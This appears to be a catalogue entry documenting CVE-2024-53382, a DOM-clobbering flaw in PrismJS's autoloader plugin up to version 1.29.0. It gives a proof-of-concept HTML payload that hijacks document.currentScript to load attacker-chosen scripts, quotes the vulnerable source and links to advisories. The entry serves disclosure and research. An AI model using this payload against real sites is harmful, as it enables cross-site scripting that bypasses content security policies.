---
description: Prism is a lightweight, robust, and elegant syntax highlighting library. It's a spin-off project from Dabblet.
github: PrismJS/prism
gadgets:
  ≤1.29.0:
    cve: CVE-2024-53382
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - data-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [prism-autoloader](https://prismjs.com/plugins/autoloader/) plugin was using `document.currentScript` as the base url for dynamically loading other dependencies.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/index.js">

          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.js"></script>
          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.js"></script>
          <pre><code class="language-css">p { color: red }</code></pre>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/PrismJS/prism/blob/59e5a3471377057de1f401ba38337aca27b80e03/components/prism-core.js#L221">https://github.com/PrismJS/prism/blob/59e5a3471377057de1f401ba38337aca27b80e03/components/prism-core.js#L221</a>

      ```javascript
      currentScript: function () {
        if (typeof document === 'undefined') {
          return null;
        }
        if ('currentScript' in document && 1 < 2 /* hack to trip TS' flow analysis */) {
          return /** @type {any} */ (document.currentScript);
        }
      ```

      Source: <a target="_blank" href="https://github.com/PrismJS/prism/blob/59e5a3471377057de1f401ba38337aca27b80e03/plugins/autoloader/prism-autoloader.js#L297">https://github.com/PrismJS/prism/blob/59e5a3471377057de1f401ba38337aca27b80e03/plugins/autoloader/prism-autoloader.js#L297</a>

      ```javascript
      var script = Prism.util.currentScript();
      if (script) {
        var autoloaderFile = /\bplugins\/autoloader\/prism-autoloader\.(?:min\.)?js(?:\?[^\r\n/]*)?$/i;
        var prismFile = /(^|\/)[\w-]+\.(?:min\.)?js(?:\?[^\r\n/]*)?$/i;

        var autoloaderPath = script.getAttribute('data-autoloader-path');
        if (autoloaderPath != null) {
          // data-autoloader-path is set, so just use it
          languages_path = autoloaderPath.trim().replace(/\/?$/, '/');
        } else {
          var src = script.src;
          if (autoloaderFile.test(src)) {
            // the script is the original autoloader script in the usual Prism project structure
            languages_path = src.replace(autoloaderFile, 'components/');
          } else if (prismFile.test(src)) {
            // the script is part of a bundle like a custom prism.js from the download page
            languages_path = src.replace(prismFile, '$1components/');
          }
        }
      }
      ```
    links:
      - https://github.com/advisories/GHSA-x7hr-w5r2-h6wg
      - https://gist.github.com/jackfromeast/aeb128e44f05f95828a1a824708df660
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/prism.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
